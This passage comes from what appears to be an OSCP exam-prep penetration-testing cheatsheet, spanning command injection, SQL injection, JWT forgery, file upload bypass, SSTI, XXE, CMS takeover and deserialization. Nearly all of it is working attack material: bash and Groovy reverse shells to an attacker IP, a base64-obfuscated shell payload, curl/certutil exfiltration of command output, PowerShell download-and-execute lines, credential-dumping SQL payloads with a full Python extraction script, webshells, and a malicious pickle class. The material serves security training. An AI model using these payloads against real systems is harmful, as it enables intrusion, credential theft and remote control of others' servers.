### 10.3: Blind Command Injection Detection
If the application generates no visible output upon command execution:
```bash
# Time-based verification: Confirm command execution via deliberate delay
; sleep 10

# Network callback verification: Monitor incoming ICMP echo requests
# On Kali: sudo tcpdump -i tun0 icmp
; ping -c 1 [KALI_IP]
```

### 10.4: Determining the Target Operating System and Shell
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
- Returns `CMD` if executing under Windows `cmd.exe`.
- Returns `PowerShell` if executing under Windows PowerShell.
- Returns an error or fails if executing under Linux `bash`/`sh`.

### 10.5: Escalating to a Reverse Shell

#### Direct Linux Reverse Shell:
```bash
# Direct bash reverse shell (URL-encode when passing via GET requests)
; bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1

# Bash -c wrapper (mandatory if default shell is dash or sh)
; bash -c "bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1"
```

#### Base64 Obfuscated Execution (Foolproof Method):
When characters like `>`, `&`, or spaces are stripped by input filters, encode the entire command in Base64:
```bash
# 1. On Kali, generate the Base64 payload string:
echo -n 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1' | base64
# Example output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==

# 2. Inject the decode-and-execute one-liner:
" && echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ== | base64 -d | bash && echo "
```

#### Windows PowerCat Reverse Shell:
```powershell
# Download and execute PowerCat entirely in memory
IEX (New-Object System.Net.Webclient).DownloadString('http://[KALI_IP]/powercat.ps1');powercat -c [KALI_IP] -p 4444 -e powershell
```
> PowerCat script location on Kali: `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`.

### 10.6: Out-of-Band (OOB) Data Exfiltration when Blind or Egress Restricted
When the injection point produces no visual output and standard reverse shell ports are filtered by egress firewalls, exfiltrate command results out-of-band:

```bash
# HTTP Out-of-Band Exfiltration (Linux)
; curl http://[KALI_IP]:8000/$(whoami)
; wget http://[KALI_IP]:8000/$(id | base64 -w0)

# Windows Out-of-Band Exfiltration
; certutil -urlcache -f http://[KALI_IP]:8000/%USERNAME%

# DNS Exfiltration (Works when all outbound TCP ports are blocked)
; ping -c 1 $(whoami).[KALI_IP]
```

---

## Phase 11: SQL Injection (SQLi)

> *See the [[💉 sql-injection|SQL Injection Cheatsheet]] for detailed database syntax (MySQL, MSSQL, PostgreSQL, Oracle).*

**Detection:** Inject boundary characters into every parameter, search input, and authentication field:
```sql
'
"
\
' OR 1=1 -- -
" OR 1=1 -- -
```

### 11.1: Authentication Bypass (Quick Wins)
```sql
admin' -- -
admin' #
admin'/*
' OR 1=1 -- -
' OR '1'='1
```

### 11.2: Union-Based Extraction Methodology

#### Step 1: Discover Column Count
Determine the exact number of columns returned by the query:
```sql
' ORDER BY 1 -- -    -- Succeeds
' ORDER BY 2 -- -    -- Succeeds
' ORDER BY 5 -- -    -- Fails -> Query uses 4 columns
```

#### Step 2: Determine Column Data Types and Display Positions
```sql
' UNION SELECT 1,2,3,4 -- -
```
Observe which numbers are rendered on the web page.

#### Step 3: Extract Database Information
```sql
# MySQL / MariaDB extraction
' UNION SELECT 1, database(), user(), version() -- -
' UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database() -- -
' UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_name='users' -- -
' UNION SELECT 1, group_concat(username,':',password), 3, 4 FROM users -- -
```

---

### 11.3: Blind SQL Injection Methodology (Manual - OSCP Required)

> [!IMPORTANT]
> **OSCP Rule Restriction:** Automated exploitation tools like `sqlmap` are **STRICTLY PROHIBITED** on the OSCP exam (except on at most one machine during the exam). Developing and running custom Python scripts for character-by-character blind extraction is an essential exam skill.

#### Boolean-Based Blind SQLi Methodology
**Concept:** Inject a condition that evaluates to `TRUE` or `FALSE`. If `TRUE`, the web page renders normally. If `FALSE`, the page changes (content missing, error message displayed, different HTTP status code).

**Step 1: Confirm Vulnerability:**
```sql
-- TRUE condition -> Page renders normally
?id=1' AND 1=1 -- -

-- FALSE condition -> Page alters or content vanishes
?id=1' AND 1=2 -- -
```

**Step 2: Determine Length:**
```sql
?id=1' AND LENGTH(database())=1 -- -    -- FALSE
?id=1' AND LENGTH(database())=5 -- -    -- TRUE -> Database name is 5 characters long
```

**Step 3: Extract Character-by-Character:**
```sql
-- Test Character at Position 1
?id=1' AND SUBSTRING(database(),1,1)='a' -- -    -- FALSE
?id=1' AND SUBSTRING(database(),1,1)='o' -- -    -- TRUE -> Character 1 is 'o'
```

#### Time-Based Blind SQLi Methodology
**Concept:** When the application returns identical responses regardless of boolean output (e.g., API returning `200 OK` in all cases), utilize database sleep functions as an information channel.

**Step 1: Confirm Vulnerability:**
```sql
-- MySQL: 3-second sleep
?id=1' AND SLEEP(3) -- -

-- Microsoft SQL Server: 5-second wait
?id=1'; WAITFOR DELAY '0:0:5' -- -

-- PostgreSQL: 5-second sleep
?id=1'; SELECT pg_sleep(5) -- -
```

**Step 2: Conditional Character Extraction:**
```sql
-- MySQL: IF(condition, SLEEP, 0)
?id=1' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0) -- -

-- MSSQL: IF ... WAITFOR
?id=1'; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:3' -- -

-- PostgreSQL: CASE WHEN ... THEN pg_sleep
?id=1'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END -- -
```

---

### 11.4: Python Script: Automated Blind SQLi Extraction (OSCP-Compliant)

```python
#!/usr/bin/env python3
"""OSCP-Compliant Blind SQL Injection Character-by-Character Extraction Tool.

Usage:
  1. Identify vulnerable parameter and determine injection mode (boolean or time).
  2. Configure TARGET_URL, PARAM_NAME, METHOD, and COOKIES.
  3. For Boolean mode: Configure TRUE_KEYWORD or response length condition.
  4. For Time mode: Configure SLEEP_TIME and THRESHOLD.
  5. Run: python3 blind_sqli.py
"""

import requests
import string
import time
import sys

# ============================================================
# CONFIGURATION: Tailor to your specific target environment
# ============================================================
TARGET_URL = "http://[TARGET_IP]/search.php"
PARAM_NAME = "id"                           # Vulnerable parameter name
METHOD = "GET"                              # HTTP Method: GET or POST
COOKIES = {"PHPSESSID": "session_token"}  # Authentication cookies if required
PROXIES = {"http": "http://127.0.0.1:8080"}  # Route through Burp Suite for debugging
# PROXIES = {}                               # Uncomment to disable proxy for speed

# Extraction Mode: "boolean" or "time"
MODE = "boolean"

# Boolean-based Settings: Substring present in HTML response only when condition is TRUE
TRUE_KEYWORD = "Welcome"

# Time-based Settings: Threshold in seconds to distinguish TRUE from FALSE responses
SLEEP_TIME = 3
THRESHOLD = 2.5

# Character set to iterate through (optimized: alphanumeric first, then symbols)
CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_@.-!#$"
MAX_LEN = 64  # Maximum string length to extract

# ============================================================
# TARGET SUBQUERY CONFIGURATION
# ============================================================
# Common subqueries to extract:
#   database()                                              -> Current database name
#   (SELECT table_name FROM information_schema.tables
#    WHERE table_schema=database() LIMIT 0,1)               -> First table name
#   (SELECT column_name FROM information_schema.columns
#    WHERE table_name='users' LIMIT 0,1)                    -> First column name
#   (SELECT password FROM users LIMIT 0,1)                  -> First user password hash

SUBQUERY = "database()"

def build_payload_boolean(pos, char):
    """Constructs MySQL Boolean-based injection payload."""
    return f"1' AND SUBSTRING(({SUBQUERY}),{pos},1)='{char}' -- -"

def build_payload_time(pos, char):
    """Constructs MySQL Time-based injection payload."""
    return f"1' AND IF(SUBSTRING(({SUBQUERY}),{pos},1)='{char}',SLEEP({SLEEP_TIME}),0) -- -"

# ============================================================
# EXTRACTION ENGINE
# ============================================================
def check_boolean(payload):
    """Issues HTTP request and verifies if TRUE_KEYWORD is present."""
    try:
        if METHOD.upper() == "GET":
            r = requests.get(TARGET_URL, params={PARAM_NAME: payload},
                             cookies=COOKIES, proxies=PROXIES, timeout=10)
        else:
            r = requests.post(TARGET_URL, data={PARAM_NAME: payload},
                              cookies=COOKIES, proxies=PROXIES, timeout=10)
        return TRUE_KEYWORD in r.text
    except requests.RequestException as e:
        print(f"\n[!] Request error: {e}")
        return False

def check_time(payload):
    """Issues HTTP request and measures response latency."""
    start = time.time()
    try:
        if METHOD.upper() == "GET":
            requests.get(TARGET_URL, params={PARAM_NAME: payload},
                         cookies=COOKIES, proxies=PROXIES, timeout=10)
        else:
            requests.post(TARGET_URL, data={PARAM_NAME: payload},
                          cookies=COOKIES, proxies=PROXIES, timeout=10)
    except requests.RequestException:
        pass
    elapsed = time.time() - start
    return elapsed > THRESHOLD

def extract():
    """Iterates over string positions and extracts values character-by-character."""
    result = ""
    check_fn = check_boolean if MODE == "boolean" else check_time
    build_fn = build_payload_boolean if MODE == "boolean" else build_payload_time

    print(f"[*] Mode: {MODE} | Target: {TARGET_URL} | Extracting: {SUBQUERY}")
    print(f"[*] Charset size: {len(CHARSET)} | Max length: {MAX_LEN}")
    print("-" * 60)

    for pos in range(1, MAX_LEN + 1):
        found = False
        for char in CHARSET:
            payload = build_fn(pos, char)
            sys.stdout.write(f"\r[*] Position {pos}: testing '{char}' ... ")
            sys.stdout.flush()

            if check_fn(payload):
                result += char
                print(f"\r[+] Position {pos}: '{char}'  -> Extracted so far: {result}")
                found = True
                break

        if not found:
            print(f"\n[!] No match found at position {pos}. Extraction complete.")
            break

    print(f"\n{'='*60}")
    print(f"[✅] FINAL RESULT: {result}")
    print(f"{'='*60}")
    return result

if __name__ == "__main__":
    extract()
```

> 💡 **Performance Optimization Tips:**
> - **Binary Search Optimization:** Replace linear character iteration with binary search using `ASCII(SUBSTRING(({SUBQUERY}),{pos},1)) > 64`. This reduces requests from ~36 per character down to 7 queries per character.
> - **Pre-calculate String Length:** Use `AND LENGTH(({SUBQUERY}))=N` first so the loop terminates immediately once the full string is retrieved.

---

### 11.5: Error-Based SQL Injection Syntax
When database error messages are displayed on the page, extract arbitrary data directly inside error strings:

```sql
-- MySQL / MariaDB (EXTRACTVALUE)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e)) -- -

-- Microsoft SQL Server (Conversion Failure)
' AND 1=CONVERT(int, (SELECT @@version)) -- -
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) -- -

-- PostgreSQL (CAST Failure)
' AND 1=CAST((SELECT version()) AS int) -- -
```

---

### 11.6: SQLite Injection and RCE via ATTACH DATABASE
SQLite is ubiquitous in lightweight CTF and exam applications. It lacks user privilege separations and information schemas:

```sql
-- Discover SQLite version and tables
' UNION SELECT 1, sqlite_version(), 3 -- -
' UNION SELECT 1, group_concat(tbl_name), 3 FROM sqlite_master WHERE type='table' -- -

-- Extract table creation schema (reveals column names)
' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table' AND name='users' -- -

-- SQLite Direct Webshell Creation (ATTACH DATABASE)
'; ATTACH DATABASE '/var/www/html/shell.php' AS lol; CREATE TABLE lol.pwn (data text); INSERT INTO lol.pwn (data) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

---

### 11.7: PostgreSQL Injection and RCE via COPY FROM PROGRAM
PostgreSQL versions >= 9.3 running with administrative privileges can execute system commands directly:

```sql
-- Execute OS commands via COPY FROM PROGRAM (PostgreSQL >= 9.3)
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; --
'; COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1"'; --
```

---

### 11.8: Escalation to Remote Code Execution (MySQL & MSSQL)

#### MySQL Direct Webshell Upload:
If MySQL runs as `root` and `secure_file_priv` is empty:
```sql
' UNION SELECT '', '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -
```

#### MSSQL OS Command Execution (`xp_cmdshell`):
If executing as `sa` (system administrator), enable and execute OS commands:
```sql
-- Enable advanced options and xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

-- Execute OS command or download reverse shell
'; EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://[KALI_IP]/shell.ps1')"'; --
```

---

## Phase 11.5: JWT Attacks

> *JSON Web Tokens (JWT) are stateless authentication tokens structured into three base64url-encoded parts separated by periods:*
> ```
> eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpM
> ├── HEADER ──────────┤├── PAYLOAD ────────────────┤├── SIGNATURE ────────┤
> ```
> - **Header:** Specifies the algorithm (`HS256`, `RS256`, `none`).
> - **Payload:** Contains user claims (`{"user": "guest", "admin": false}`).
> - **Signature:** Cryptographic verification preventing unauthorized modification.
>
> *Vulnerability Mechanism: Applications frequently trust the algorithm declared in the user-supplied Header to verify signatures, allowing attackers to forge tokens.*

### Detecting and Interacting with JWTs
- Located in cookies or HTTP request headers: `Authorization: Bearer eyJ...`.
- Always begins with `eyJ` (the base64url representation of `{"`).
- Decode and inspect claims using `jwt_tool` or [jwt.io](https://jwt.io).

```bash
# Clone and install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# Decode an existing token
python3 jwt_tool.py <JWT_TOKEN>

# Run comprehensive automated vulnerability scan
python3 jwt_tool.py <JWT_TOKEN> -M at -t "http://[TARGET_IP]/api/protected" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```

### Attack 1: Algorithm "none" (CVE-2015-9235)
If the backend accepts `"alg": "none"`, signature verification is skipped:
```bash
# Automated forgery via jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -X a

# Manual Token Forgery:
# 1. Base64url encode the modified header: {"alg":"none"} -> eyJhbGciOiJub25lIn0
# 2. Base64url encode modified payload: {"user":"admin","admin":true} -> eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0
# 3. Concatenate without signature (preserving trailing dot):
# eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.
```

### Attack 2: Algorithm Confusion (RS256 to HS256)
- **RS256:** Asymmetric encryption where the server signs with its private key and verifies with its public key.
- **HS256:** Symmetric encryption where the same key is used to both sign and verify.
- **Exploitation:** Change the header to `"alg": "HS256"`. The server will use its public verification key as the HMAC symmetric secret. Obtain the public key and sign the forged token using that key.

```bash
# 1. Extract the public key from the target application
curl -s http://[TARGET_IP]/.well-known/jwks.json > public.key
# Alternatively: openssl s_client -connect [TARGET_IP]:443 | openssl x509 -pubkey -noout > public.key

# 2. Forge token using public key as symmetric secret
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.key
```

### Attack 3: Weak Secret Brute-Force
When HS256 utilizes a weak HMAC secret, crack the key offline:
```bash
# Crack JWT secret with Hashcat (mode 16500)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Crack with jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Forge administrative token with discovered secret
python3 jwt_tool.py <JWT_TOKEN> -T -S hs256 -p "discovered_secret"
```

### Attack 4: JWK and JKU Header Injection
If the target server accepts external keys specified in the token header:
```bash
# Inject attacker-hosted JWKS URL via jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -X s -ju "http://[KALI_IP]/jwks.json"
```

### Attack 5: kid Parameter Injection (Path Traversal & SQLi)
The `kid` (Key ID) header parameter specifies which key file or database entry to use for verification:
- **Path Traversal in `kid`:** Point `kid` to `/dev/null` or an empty file on the server:
  `{"alg":"HS256","kid":"../../../../../../dev/null"}`
  Sign the token using an empty HMAC key (`""`).
- **SQLi in `kid`:** If `kid` queries a database:
  `{"alg":"HS256","kid":"key' UNION SELECT 'attacker_secret' -- -"}`
  Sign the token using `'attacker_secret'`.

---

## Phase 12: File Upload Vulnerabilities

> *File upload vulnerabilities represent one of the most reliable and direct pathways to Remote Code Execution on OSCP targets.*

### Standard Assessment Workflow
1. Locate file upload forms (profile avatars, attachments, file managers).
2. Attempt uploading a standard PHP or ASPX webshell directly.
3. If rejected, identify which validation mechanism is active (extension blacklist, MIME type, magic bytes, or file size).
4. Apply the corresponding bypass techniques detailed below.
5. Identify the upload directory and trigger the uploaded file to execute commands.

### Base Webshell Payloads
```php
// PHP minimal command execution webshell
<?php system($_GET['cmd']); ?>
```
```aspx
<%-- ASP.NET minimal command execution webshell --%>
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>
```

### Filter Bypass Techniques

#### Extension Blacklist Bypasses:
If `.php` or `.aspx` are explicitly filtered, test alternative executable extensions:
- **PHP alternatives:** `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phar`, `.pht`, `.inc`
- **ASP.NET alternatives:** `.asp`, `.aspx`, `.ashx`, `.asmx`, `.config`
- **JSP alternatives:** `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`

#### Filename Manipulation Bypasses:
- **Double extensions:** `shell.php.jpg`, `shell.php.png`
- **Null byte termination (PHP < 5.3.4):** `shell.php%00.jpg`
- **Case variation:** `shell.pHp`, `shell.PHP`, `shell.pHTML`
- **Trailing characters:** `shell.php.`, `shell.php `
- **Windows NTFS Alternate Data Streams:** `shell.php::$DATA`

#### MIME Type Spoofing:
Intercept the upload request in Burp Suite and alter the `Content-Type` header:
```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg
```

#### Magic Bytes Header Injection:
Prepend legitimate image file signatures to the webshell:
```bash
# Add GIF89a magic bytes to PHP webshell
echo -n 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.php.gif

# Alternatively, prepend to an existing script
echo -n 'GIF89a;' | cat - shell.php > shell_magic.php
```

#### Web Server Configuration Overrides:
- **Apache (`.htaccess`):** Upload a custom `.htaccess` file into the upload folder to instruct Apache to execute `.jpg` files as PHP scripts:
```apache
AddType application/x-httpd-php .jpg
```
Once uploaded, upload your webshell named `shell.jpg`.
- **IIS (`web.config`):** Upload a `web.config` file that maps `.txt` or `.jpg` extensions to the ASP.NET execution handler.

### 12.6: .user.ini Configuration Override (PHP-FPM and Nginx)
On Nginx or Apache with PHP-FPM, `.htaccess` files are ignored. Use `.user.ini` to force automatic inclusion of uploaded files:
1. Upload a file named `.user.ini` into the upload directory:
```ini
auto_prepend_file=shell.png
```
2. Upload `shell.png` containing raw PHP code:
```php
<?php system($_GET['cmd']); ?>
```
3. Whenever any legitimate `.php` script residing in or beneath that directory is requested via HTTP, `shell.png` is automatically executed.

### 12.7: Zip Slip and Archive Extraction Path Traversal
If the target application accepts `.zip`, `.tar`, or `.tar.gz` archives and automatically unpacks them on the server, embed path traversal in file paths within the archive:
```bash
# Create an archive that extracts shell.php directly into /var/www/html/
python3 -c "
import zipfile
z = zipfile.ZipFile('exploit.zip', 'w')
z.writestr('../../../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
z.close()
"
```

### Discovering the Uploaded File Path
Inspect page source code, network responses, and directory structures for storage paths:
```
/uploads/shell.php
/files/shell.php
/images/shell.php
/wp-content/uploads/shell.php
/media/shell.php
```

---

## Phase 13: SSTI (Server-Side Template Injection)

> *Server-Side Template Injection occurs when an application embeds unsanitized user input directly into a template engine string before rendering.*

### Detection Syntax
Test universal template expression syntax in search bars and parameter inputs:
```
{{7*7}}          # If response displays '49' -> SSTI confirmed
${7*7}          # Java / JSP / Smarty syntax
#{7*7}          # Ruby syntax
{{7*'7'}}        # Returns '7777777' on Jinja2 (Python), '49' on Twig (PHP)
```

### Engine-Specific Exploitation

#### Jinja2 (Python - Flask and Django):
```python
# Arbitrary file read
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Interactive reverse shell
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1"').read()}}
```

#### Twig (PHP - Symfony):
```
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

#### Freemarker (Java):
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

---

## Phase 14: XXE (XML External Entity Injection)

> *XML External Entity injection occurs when an XML parser processes untrusted XML documents containing external entity references.*

### Base File Disclosure Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### High-Value Exploitation Variants
```xml
<!-- Reading Windows system files -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">

<!-- Internal SSRF interrogation -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">

<!-- PHP base64 encapsulation filter (prevents XML parsing errors on code/config files) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

---

## Phase 15: CMS Exploitation Workflows

### 15.1: WordPress
```bash
# Automated enumeration with WPScan
wpscan --url http://[TARGET_IP]/ -e u,vp,vt --plugins-detection aggressive

# Target password brute-force against discovered accounts
wpscan --url http://[TARGET_IP]/ -U admin -P /usr/share/wordlists/rockyou.txt

# Remote Code Execution via Theme Editor (Once authenticated as Administrator):
# 1. Navigate to: Appearance -> Theme Editor
# 2. Select 404.php (or an alternative inactive template).
# 3. Replace template contents with a PHP reverse shell payload.
# 4. Click 'Update File'.
# 5. Trigger the reverse shell by navigating to the template or a non-existent page:
curl http://[TARGET_IP]/wp-content/themes/[THEME_NAME]/404.php
curl http://[TARGET_IP]/?p=9999999

# Post-exploitation database credential harvesting
cat /var/www/html/wp-config.php
```

### 15.2: Apache Tomcat
```bash
# Standard administrative credentials to test:
# tomcat:tomcat | admin:admin | tomcat:s3cret | role1:role1 | manager:manager
# Administrative portal: http://[TARGET_IP]:8080/manager/html

# Generate a malicious WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f war -o shell.war

# Deploy WAR via the Tomcat Web Application Manager GUI or curl:
curl -u 'tomcat:s3cret' -T shell.war 'http://[TARGET_IP]:8080/manager/text/deploy?path=/shell&update=true'

# Trigger the reverse shell
curl http://[TARGET_IP]:8080/shell/
```

### 15.3: Drupal
```bash
# Drupalgeddon2 (CVE-2018-7600) affecting Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1
searchsploit drupal
python3 drupalgeddon2.py http://[TARGET_IP]/
```

### 15.4: Joomla Exploitation Workflow
```bash
# Automated vulnerability scan with JoomScan
joomscan --url http://[TARGET_IP]/

# RCE via Template Manager (Once authenticated as Administrator):
# 1. Navigate to: Extensions -> Templates -> Templates
# 2. Select the active template (e.g., Protostar Details and Files).
# 3. Edit error.php or index.php.
# 4. Insert your PHP reverse shell payload and click Save.
# 5. Trigger execution:
curl http://[TARGET_IP]/templates/protostar/error.php
```

### 15.5: Jenkins Script Console Groovy RCE
If Jenkins is unauthenticated or administrative credentials have been discovered, access the Groovy Script Console at `http://[TARGET_IP]:8080/script`:

```groovy
// Execute reverse shell via Groovy Script Console
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c "bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1"'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

---

## Phase 16: Deserialization Vulnerabilities

> *Serialization converts in-memory objects (attributes, classes, state) into a byte stream or formatted string for persistence or network transmission.*
> *Deserialization reconstructs the live object in memory from the serialized stream.*
>
> *Vulnerability Mechanism: When an application deserializes untrusted input, the reconstruction process automatically executes magic methods (`readObject()`, `__reduce__()`, `__destruct()`) or triggers chained class calls ("gadgets") that execute arbitrary system commands.*

### Detection Indicators
| Indicator Type | Signature / Format | Technology |
| --- | --- | --- |
| **Java Base64 Objects** | Starts with `rO0AB` | Java (`ObjectInputStream`) |
| **Java Hex Signatures** | `AC ED 00 05` | Java Serialized Object |
| **Python Pickle Objects** | Starts with `gASV` (protocol 4) or `gAM` (protocol 3) | Python `pickle` module |
| **PHP Serialized Strings** | `O:4:"User":...` or `a:2:{...}` | PHP `unserialize()` |
| **ASP.NET ViewState** | Hidden input `__VIEWSTATE` starting with `/wEP` | .NET `LosFormatter` / `ObjectStateFormatter` |
| **Node.js Function Serialization** | Object containing `_$$ND_FUNC$$_` | Node.js `node-serialize` |
| **Suspicious Content-Type** | `application/x-java-serialized-object` | Java Remote Method Invocation (RMI) / Spring |

---

### 16.1: Java Deserialization (ysoserial)
Java uses `ObjectInputStream.readObject()` to deserialize objects. Libraries including Apache Commons Collections, Spring, and Hibernate contain "gadget chains" that execute arbitrary commands during object reconstruction.

```bash
# 1. Inspect and decode base64 strings to verify Java magic bytes
echo "[BASE64_BLOB]" | base64 -d | xxd | head -n 2
# Output starting with 'aced 0005' confirms a Java serialized object.

# 2. Download ysoserial suite
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# 3. Generate a command execution payload (testing via ping or reverse shell)
java -jar ysoserial-all.jar CommonsCollections1 'ping -c 3 [KALI_IP]' | base64 -w0

# 4. Generate reverse shell payload using the base64 wrapper pipeline
java -jar ysoserial-all.jar CommonsCollections4 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9LQUxJX0lQLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' \
  | base64 -w0

# 5. Inject payload into vulnerable cookie or POST parameter
curl -s -b "session=[GENERATED_PAYLOAD]" http://[TARGET_IP]/dashboard
```

---

### 16.2: Python Pickle Deserialization
Python's `pickle` library serializes arbitrary objects. The magic method `__reduce__()` instructs the unpickler how to reconstruct the object. Detour this method to call `os.system()`:

```python
import pickle
import base64
import os

class MaliciousPayload:
    def __reduce__(self):
        # __reduce__ returns a tuple: (callable, arguments)
        cmd = ('bash -c "bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1"',)
        return (os.system, cmd)

# Generate base64-encoded serialized payload
payload = base64.b64encode(pickle.dumps(MaliciousPayload())).decode()
print(payload)
```

#### Flask Session Tampering (`flask-unsign`):
If a Flask application signs session cookies using `pickle` and the `SECRET_KEY` is known or crackable:
```bash
# Decode Flask session cookie
flask-unsign --decode --cookie 'eyJ...'

# Crack secret key against rockyou wordlist
flask-unsign --unsign --cookie 'eyJ...' --wordlist /usr/share/wordlists/rockyou.txt

# Sign forged payload using the recovered secret key
flask-unsign --sign --cookie "{'admin': True}" --secret 'discovered_key'
```

---

### 16.3: .NET ViewState Deserialization
ASP.NET stores page state in the `__VIEWSTATE` hidden field. If ViewState MAC validation is disabled (`EnableViewStateMac=false`) or if the cryptographic `machineKey` is exposed in `web.config`:
```bash
# Generate ViewState deserialization payload using ysoserial.net
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "powershell -e [BASE64_POWERSHELL_PAYLOAD]" \
  --validationalg="SHA1" \
  --validationkey="[VALIDATION_KEY]" \
  --generator="[VIEWSTATE_GENERATOR]" \
  --isdebug
```
Replace the `__VIEWSTATE` POST parameter with the generated payload.

---

### 16.4: PHP Object Injection
PHP invokes `__wakeup()` and `__destruct()` magic methods automatically upon deserialization.
```php
<?php
// Example: Application source code includes a vulnerable Logger class
class Logger {
    public $logFile;
    public $logData;
    function __destruct() {
        file_put_contents($this->logFile, $this->logData);
    }
}

// Craft malicious object to write a webshell
$exploit = new Logger();
$exploit->logFile = '/var/www/html/shell.php';
$exploit->logData = '<?php system($_GET["cmd"]); ?>';
echo serialize($exploit);
// Produces: O:6:"Logger":2:{s:7:"logFile";s:24:"/var/www/html/shell.php";s:7:"logData";s:30:"<?php system($_GET["cmd"]); ?>";}
?>
```

---

### 16.5: Node.js Deserialization (node-serialize IIFE)
In Node.js applications utilizing the `node-serialize` package, arbitrary JavaScript functions can be serialized using the `_$$ND_FUNC$$_` notation. Wrap the function body into an Immediately Invoked Function Expression (IIFE) using `()` to trigger execution upon deserialization:

```javascript
// Craft Node.js node-serialize IIFE payload
{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('bash -c "bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1"', function(error, stdout, stderr) { console.log(stdout) });}()"}
```
Encode this JSON structure to Base64 if transmitted inside a cookie or session parameter.

---

## Phase 17: Java Runtime.exec() Reverse Shells in Restricted Environments

> [!CAUTION]
> **Critical OSCP Trap:** Many Java-based vulnerabilities (such as Text4Shell, Log4Shell, Apache Struts, Spring4Shell, and Tomcat CVEs) execute operating system commands via `java.lang.Runtime.getRuntime().exec(String)`. Standard reverse shell one-liners (`bash -i >& /dev/tcp/...`) **fail silently** in this context.

### Why Standard Reverse Shells Fail in Java
When Java invokes `Runtime.getRuntime().exec("bash -i >& /dev/tcp/IP/PORT 0>&1")`:
1. Java does **not** launch a shell subprocess to parse the string.
2. It tokenizes the string purely by whitespace into distinct argument tokens:
   - Argument 0: `bash`
   - Argument 1: `-i`
   - Argument 2: `>&` *(Treated as a literal argument rather than shell redirection!)*
   - Argument 3: `/dev/tcp/IP/PORT`
   - Argument 4: `0>&1`
3. Redirection operators (`>`, `|`, `;&`, `&&`) require a running shell instance and are never parsed by `exec()`.

---

### The 4 Reliable Solutions

#### Solution 1: The `bash -c` Wrapper (Most Reliable on Linux)
Encapsulate the entire command as a single argument passed to `bash -c`:
```bash
# Clean syntax: Command is a single token passed to the sub-shell
bash -c 'bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1'

# In URL-encoded or parameter contexts:
bash+-c+'bash+-i+>%26+/dev/tcp/[KALI_IP]/4444+0>%261'
```

